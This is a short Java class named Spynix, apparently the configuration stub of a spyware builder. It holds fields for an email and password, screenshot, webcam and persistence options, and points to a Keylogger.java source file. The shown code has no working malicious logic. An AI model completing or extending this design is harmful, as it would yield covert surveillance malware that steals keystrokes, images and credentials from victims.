package ml.inix;

import java.util.Scanner;

public class Spynix {

    private static Scanner scanner;
    private static String email;
    private static String password;
    private static String path_source;
    private static int count;
    private static boolean screenshot;
    private static boolean webcam;
    private static boolean persistence;
    private static boolean keep_data;

    private void init() {
        scanner = new Scanner(System.in);
        path_source = "src/main/java/ml/inix/Keylogger.java";
    }


}
